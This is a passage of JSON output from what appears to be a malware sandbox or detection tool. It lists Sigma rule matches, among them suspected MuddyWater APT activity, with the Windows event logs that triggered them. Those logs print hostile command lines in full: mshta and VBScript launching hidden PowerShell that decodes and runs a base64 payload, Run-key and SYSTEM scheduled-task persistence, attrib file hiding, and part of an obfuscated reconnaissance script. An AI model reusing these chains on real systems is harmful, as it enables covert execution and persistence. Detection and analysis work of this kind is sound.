                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9D1A-64AD-5706-000000004400}; ProcessId=3500; Product=Microsoft\\xae Windows\\xae Operating System; Description=Attribute Utility; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CE6-64AD-4906-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=FDC601145CD289C6FBC96D3F805F3CD7,SHA256=FF8600A444A3F086F17A24293E0172E6033D62C3766D4497997B882D663F8221,IMPHASH=2CB38FE7D8F223D9DA50B7CBA9B95A6D; OriginalFileName=ATTRIB.EXE; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4236; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\attrib.exe\" +s +h C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini; EventID=1; LogonGuid=C784477D-CFAC-648A-8E99-030000000000; LogonId=235918; Image=C:\\Windows\\System32\\attrib.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; UtcTime=1689099546; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=0E938DD280E83B1596EC6AA48729C2B0,SHA256=1DD136CD5B90C2ABC4F163429A99ED32A7D4B047407DF45D96E20130F8B14920,IMPHASH=F0A82FEBA5B0EF2BE614622AE3E32C1C; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=ATTRIB.EXE; Product=Microsoft\\xae Windows\\xae Operating System; Description=Attribute Utility; FileVersion=10.0.19041.1 (WinBuild.160101.0800); EventID=1; CommandLine=\"C:\\Windows\\system32\\attrib.exe\" +s +h C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\attrib.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "b9bc90b7745bcb3a2cf9de40d1d419d18ead6650040015c7f4755848e9bfdb05",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious MSHTA Child Process",
                                                                       "rule_description":  "Detects a suspicious process spawning from an \"mshta.exe\" process, which could be indicative of a malicious HTA script execution",
                                                                       "rule_author":  "Michael Haag",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=PowerShell.EXE; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\mshta.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "c2860e5a2a470c1dbb00003a43f3a9f04e5180cb5c7ec9e7a5bdcdfdd86a15a9",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential MuddyWater APT Activity",
                                                                       "rule_description":  "Detects potential Muddywater APT activity",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=MSHTA.EXE; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; EventID=1; ParentCommandLine=\"C:\\Windows\\System32\\WScript.exe\" \"C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" ; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentImage=C:\\Windows\\SysWOW64\\wscript.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\mshta.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "c6cac3013982f7f078cbf7fdc49b83f80fe4377b7ba4434f2533c34c98a85608",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Command Patterns In Scheduled Task Creation",
                                                                       "rule_description":  "Detects scheduled task creation using \"schtasks\" that contain potentially suspicious or uncommon commands",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=478BEAEC1C3A9417272BC8964ADD1CEE,SHA256=9A121ACF7686D2883E524332111D5E4BCC0C1A8E81136486FBA4CA65CA614407,IMPHASH=918DBB01101BFA7F1042CCA9520D2A05; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=schtasks.exe; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; EventID=1; ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsMalwareByteSDK /TR \"wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" /F; FileVersion=10.0.19041.906 (WinBuild.160101.0800); ParentImage=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\schtasks.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e75e9983c2277304aa1294c0b077a3139a8405cd1661ccf513a6c05a002acacf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Base64 Encoded PowerShell Command Detected",
                                                                       "rule_description":  "Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Product=Internet Explorer; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=MSHTA.EXE; Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; Description=Microsoft (R) HTML Application host; EventID=1; ParentCommandLine=\"C:\\Windows\\System32\\WScript.exe\" \"C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" ; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentImage=C:\\Windows\\SysWOW64\\wscript.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\mshta.exe; Company=Microsoft Corporation}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=PowerShell.EXE; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\\Windows\\SysWOW64\\mshta.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "06b48fa7870d38bdf92b4d4a9b9c4a4df779bd405fdc5ba0e70911df20027ce1",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Change PowerShell Policies to an Insecure Level",
                                                                       "rule_description":  "Detects changing the PowerShell script execution policy to a potentially insecure level using the \"-ExecutionPolicy\" flag.",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\mshta.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "18842e32896dd83b8aca4d5e1ac78c1f66b1d252479c0023cdd02f108c42c8cd",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Wow6432Node CurrentVersion Autorun Keys Modification",
                                                                       "rule_description":  "Detects modification of autostart extensibility point (ASEP) in registry.",
                                                                       "rule_author":  "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{RuleName=T1060,RunKey; Details=wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; EventID=13; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; EventType=SetValue; TargetObject=HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareByteSDK}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "5c3ea6806114163b8cdf5735aeb07e702ab63e0e486f721df84cf675e2b0a04b",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Hiding Files with Attrib.exe",
                                                                       "rule_description":  "Detects usage of attrib.exe to hide files from users.",
                                                                       "rule_author":  "Sami Ruohonen",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=ATTRIB.EXE; Hashes=MD5=0E938DD280E83B1596EC6AA48729C2B0,SHA256=1DD136CD5B90C2ABC4F163429A99ED32A7D4B047407DF45D96E20130F8B14920,IMPHASH=F0A82FEBA5B0EF2BE614622AE3E32C1C; Description=Attribute Utility; EventID=1; FileVersion=10.0.19041.1 (WinBuild.160101.0800); CommandLine=\"C:\\Windows\\system32\\attrib.exe\" +s +h C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\attrib.exe; Company=Microsoft Corporation}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=ATTRIB.EXE; Hashes=MD5=0E938DD280E83B1596EC6AA48729C2B0,SHA256=1DD136CD5B90C2ABC4F163429A99ED32A7D4B047407DF45D96E20130F8B14920,IMPHASH=F0A82FEBA5B0EF2BE614622AE3E32C1C; Description=Attribute Utility; FileVersion=10.0.19041.1 (WinBuild.160101.0800); EventID=1; CommandLine=\"C:\\Windows\\system32\\attrib.exe\" +s +h C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\attrib.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "6291f85314c7d9966be831c56d3cdfb30f42c84f599273e73dac5c95e1122abf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Usage Of Web Request Commands And Cmdlets - ScriptBlock",
                                                                       "rule_description":  "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs",
                                                                       "rule_author":  "James Pemberton / @4A616D6573",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=4104; ScriptBlockText=function EHVJAOKCSZMVHPEDLSLVYIMHQLMLHZ(){\r\n\ttry{\r\n\t\t$ips = \"\"\r\n\t\tGet-WmiObject Win32_NetworkAdapterConfiguration -Filter \"IPEnabled=True\" | Where{$_.IPAddress[0] -NotLike \u0027169*\u0027} | % {$ips = $ips + \"-\" + $_.IPAddress[0]}\r\n\t\treturn $ips.substring(1);\r\n\t} catch {\r\n\t\treturn \"ErrorIP\";\r\n\t}\r\n}\r\n\r\nfunction KIDVASORSGSWJJDTRWQVYCOARXFNSZ($ip){\r\n\ttry{\r\n\t\treturn BJBNWBIAKGSYUIGKMGNARSXPPCTFFC $country_url$ip;\r\n\t} catch {\r\n\t\treturn \"ErrorCountry\";\r\n\t}\r\n}\r\n\r\nfunction SVALJZVQIPBXUTRZGHGUGBWFQBLTFN(){\r\n\ttr; ScriptBlockId=06bfad09-15ed-4dcf-b729-97c65385ec33; MessageNumber=1; MessageTotal=1; Path=}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "6e1823de286f8bef414c648f5738bec3bd40700cba3765da26e6500bc2d8e387",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Powershell Detect Virtualization Environment",
                                                                       "rule_description":  "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments.\nThis may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox\n",
                                                                       "rule_author":  "frack113, Duc.Le-GTSC",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=4104; ScriptBlockText=function EHVJAOKCSZMVHPEDLSLVYIMHQLMLHZ(){\r\n\ttry{\r\n\t\t$ips = \"\"\r\n\t\tGet-WmiObject Win32_NetworkAdapterConfiguration -Filter \"IPEnabled=True\" | Where{$_.IPAddress[0] -NotLike \u0027169*\u0027} | % {$ips = $ips + \"-\" + $_.IPAddress[0]}\r\n\t\treturn $ips.substring(1);\r\n\t} catch {\r\n\t\treturn \"ErrorIP\";\r\n\t}\r\n}\r\n\r\nfunction KIDVASORSGSWJJDTRWQVYCOARXFNSZ($ip){\r\n\ttry{\r\n\t\treturn BJBNWBIAKGSYUIGKMGNARSXPPCTFFC $country_url$ip;\r\n\t} catch {\r\n\t\treturn \"ErrorCountry\";\r\n\t}\r\n}\r\n\r\nfunction SVALJZVQIPBXUTRZGHGUGBWFQBLTFN(){\r\n\ttr; ScriptBlockId=06bfad09-15ed-4dcf-b729-97c65385ec33; MessageNumber=1; Path=; MessageTotal=1}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "83ab725e0e176c0c59e352231c53ea9aca280a122aaa1c79b3ac8cd955147dab",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Wscript Shell Run In CommandLine",
                                                                       "rule_description":  "Detects the presence of the keywords \"Wscript\", \"Shell\" and \"Run\" in the command, which could indicate a suspicious activity",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CC5-64AD-3D06-000000004400}; ProcessId=6624; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CC5-64AD-3C06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; OriginalFileName=MSHTA.EXE; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentProcessId=972; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; LogonGuid=C784477D-CFAC-648A-5D99-030000000000; LogonId=235869; Image=C:\\Windows\\System32\\mshta.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\WScript.exe\" \"C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" ; UtcTime=1689099461; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CE6-64AD-4806-000000004400}; ProcessId=6068; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CE5-64AD-4706-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; OriginalFileName=MSHTA.EXE; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentProcessId=1452; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; LogonGuid=C784477D-CFAC-648A-8E99-030000000000; LogonId=235918; Image=C:\\Windows\\System32\\mshta.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\wscript.exe\" C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; UtcTime=1689099494; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CEE-64AD-4C06-000000004400}; ProcessId=3372; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CED-64AD-4B06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; OriginalFileName=MSHTA.EXE; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentProcessId=2324; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; LogonGuid=C784477D-CFAC-648A-8E99-030000000000; LogonId=235918; Image=C:\\Windows\\System32\\mshta.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\wscript.exe\" C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; UtcTime=1689099502; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CF6-64AD-5006-000000004400}; ProcessId=3632; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CF5-64AD-4F06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; OriginalFileName=MSHTA.EXE; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentProcessId=6472; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; LogonGuid=C784477D-CFAC-648A-8E99-030000000000; LogonId=235918; Image=C:\\Windows\\System32\\mshta.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\wscript.exe\" C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; UtcTime=1689099510; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Product=Internet Explorer; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=MSHTA.EXE; Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\WScript.exe\" \"C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" ; CommandLine=\"C:\\Windows\\System32\\mshta.exe\" vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));\"\",0 \")); EventID=1; ParentImage=C:\\Windows\\SysWOW64\\wscript.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\mshta.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "CurrentVersion Autorun Keys Modification",
                                                                       "rule_description":  "Detects modification of autostart extensibility point (ASEP) in registry.",
                                                                       "rule_author":  "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=5600; EventType=SetValue; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-9CC6-64AD-3E06-000000004400}; UtcTime=1689099483; Details=wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareByteSDK}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=5600; EventType=SetValue; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; RuleName=T1060,RunKey; UtcTime=1689099483; Details=wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; ProcessGuid={C784477D-9CC6-64AD-3E06-000000004400}; TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareByteSDK}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=4236; EventType=SetValue; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; ProcessGuid={C784477D-9CE6-64AD-4906-000000004400}; UtcTime=1689099546; Details=wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareByteSDK}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{RuleName=T1060,RunKey; EventType=SetValue; Details=wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; EventID=13; TargetObject=HKU\\S-1-5-21-4005801669-2598574594-602355426-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareByteSDK}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "e36b579d4bc4ef49ede1d82dd08ec1cba660d105c6f037d12ecf79b434617e88",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Schtasks Schedule Type With High Privileges",
                                                                       "rule_description":  "Detects scheduled task creations or modification to be run with high privileges on a suspicious schedule type",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
